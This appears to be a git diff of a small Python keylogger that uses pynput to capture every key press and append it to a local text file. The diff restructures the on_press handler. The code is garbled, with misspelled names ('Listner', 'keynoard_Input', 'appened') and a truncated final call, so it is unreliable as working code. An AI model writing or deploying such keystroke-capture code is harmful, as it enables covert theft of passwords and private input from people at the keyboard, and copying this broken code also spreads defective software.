@@ -4,15 +4,16 @@ from pynput.keyboard import Listner
 path = 'keyboard_input.txt'
 keynoard_Input = []
 count = 0
+
 def on_press(key):
     global keyboard_Input, count
     keyboard_Input.appened(key)
     count += 1
-
-if count > 0:
-    count = 0
-    write_to_file(keyboard_Input)
-    keyboard_Input = []
+    
+    if count > 0:
+        count = 0
+        write_to_file(keyboard_Input)
+        keyboard_Input = []
 
 def write_to_file(keys):
     with open(path, 'a') as file:
@@ -29,5 +30,5 @@ def write_to_file(keys):
           elif write_down.find('key'):
               file.write(write_down)
 
-with Listener(on_press=on_press) as listener:
-  listener.join()
+with Listener(on_press=on_press) as listener: 
+  listener.join(
